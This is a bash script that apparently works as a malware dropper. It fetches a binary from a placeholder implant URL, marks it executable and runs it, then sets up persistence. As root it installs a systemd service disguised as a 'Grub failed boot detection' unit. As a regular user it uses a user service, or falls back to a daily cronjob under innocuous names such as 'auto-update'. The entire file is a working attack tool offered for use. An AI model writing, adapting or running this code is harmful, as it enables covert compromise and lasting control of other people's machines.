#!/bin/bash

download() {
    url="$1"
    out="$2"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "$url" -o "$out" && return 0
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -qO "$out" "$url" && return 0
    fi

    if command -v fetch >/dev/null 2>&1; then
        fetch -o "$out" "$url" && return 0
    fi

    if command -v python3 >/dev/null 2>&1; then
        python3 - <<EOF
import urllib.request
urllib.request.urlretrieve("$url", "$out")
EOF
        return $?
    fi

    echo "[!]-----| Can't download binary.." >&2
    return 1
}

get_home() {
    local user="${1:-$USER}"

    awk -F: -v user="$user" '
        $1 == user {
            print $6
            exit
        }
    ' /etc/passwd
}

USER=$(id -un)
HOME=$(get_home "$USER")
url="<URL_IMPLANT>"
out="/tmp/c8d11180c956e5b5afc3d1970ce2193e"

echo "[v]-----| HOME:     $HOME"
echo "[v]-----| USER:     $USER"
echo "[v]-----| URL:      $url"
echo "[v]-----| OUT:      $out"

if download "$url" "$out"; then
    echo "[+]-----| [Success] Binary successfully downloaded!"
    echo "[i]-----| [Info]    Setting up binary.."
    chmod +x "$out"

    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
        echo "[i]-----| [Info]    Setting up global systemd service.."
        mv "$out" /usr/bin/grub-failed
        cat > "/etc/systemd/system/grub-failed.service" <<EOF
[Unit]
Description=Grub failed boot detection
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/grub-failed
Restart=always

[Install]
WantedBy=default.target
EOF

        systemctl daemon-reload 2>/dev/null
        systemctl enable "grub-failed" 2>/dev/null
        systemctl start "grub-failed" 2>/dev/null &

        sleep 2
        p=$(systemctl is-active "grub-failed" 2>/dev/null)
        if [[ "$p" == "active" || "$p" == "activating" ]]; then
            systemctl restart "grub-failed" &
            echo "[+]-----| [Success] Binary persistence established!"
            echo "[i]-----| [Info]    Check systemd: $ systemctl --no-pager status grub-failed"
        else
            echo "[!]-----| [Failed]  Failed to established persistence.."
        fi
        echo "[i]-----| [Info]    Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
    fi

    if [ "$(id -u)" -gt 1000 ]; then
        echo "[i]-----| [Info]    Setting up local(user) systemd service.."

        service_dir="$HOME/.config/systemd/user"
        echo "[v]-----| service_dir: $service_dir"

        service_file="$service_dir/grub-failed.service"
        echo "[v]-----| service_file: $service_file"

        implant="$service_dir/grub-failed"
        echo "[v]-----| implant: $implant"

        mkdir -p "$service_dir"
        mv "$out" "$implant"

        cat > "$service_file" <<EOF
[Unit]
Description=Grub failed boot detection
After=network.target

[Service]
Type=simple
ExecStart=$service_dir/grub-failed
Restart=always

[Install]
WantedBy=default.target
EOF

        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "grub-failed" 2>/dev/null
        systemctl --user start "grub-failed" 2>/dev/null

        sleep 2
        p=$(systemctl --user is-active "grub-failed" 2>/dev/null)
        if [[ "$p" == "active" || "$p" == "activating" ]]; then
            systemctl --user restart "grub-failed" &
            echo "[+]-----| [Success] Binary persistence established!"
            echo "[i]-----| [Info]    Check systemd: $ systemctl --no-pager --user status grub-failed"
        else
            echo "[!]-----| [Success] Failed to established persistence/var/www/.config/systemd/user/grub-failed.."
            echo "[i]-----| [Info]    Setting up cronjob for persistence.."

            mkdir -p "$HOME/.config/tasks"
            mv "$implant" "$HOME/.config/tasks/auto-update"
            persist="@daily $HOME/.config/tasks/auto-update"

            if command -v crontab >/dev/null 2>&1; then
                (crontab -l 2>/dev/null; echo "$persist") | crontab -
                last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
                if [ "$last_line" = "$persist" ]; then
                    echo "[+]-----| [Success] Cronjob successfully created!"
                    echo "[i]-----| [Info]    Persistence established.."
                else
                    echo "[!]-----| [Failed]  Failed to add cronjob.."
                fi
            else
                echo "[!]-----| [Failed]  Failed to add cronjob.."
            fi
            echo "[i]-----| [Info]    Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
            nohup ~/.config/tasks/auto-update &>/dev/null & disown
        fi
    else
        echo "[i]-----| [Info]    Setting up cronjob for persistence.."

        if [ -d /var/tmp ] && [ -w /var/tmp ]; then
            tasks="/var/tmp"
        else
            tasks="/tmp"
        fi

        binary="$tasks/update"
        echo "[v]-----| binary:   $binary"

        mkdir -p $tasks
        mv "$out" $binary

        nohup $binary &>/dev/null & disown

        persist="@daily $binary"
        echo "[v]-----| persist:  $persist"

        if command -v crontab >/dev/null 2>&1; then
            (crontab -l 2>/dev/null; echo "$persist") | crontab -
            last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
            if [ "$last_line" = "$persist" ]; then
                echo "[+]-----| [Success] Cronjob successfully created!"
                echo "[i]-----| [Info]    Persistence established.."
            else
                echo "[!]-----| [Failed]  Failed to add cronjob.."
            fi
        else
            echo "[!]-----| [Failed]  Failed to add cronjob.."
        fi
        echo "[i]-----| [Info]    Run the binary: $ nohup $binary &>/dev/null & disown"
        nohup $binary &>/dev/null & disown
    fi
else
    echo "[!]-----| [Failed]  Failed downloading binary!"
    echo "[!]-----| [Failed]  Canceling persistence installment..."
fi
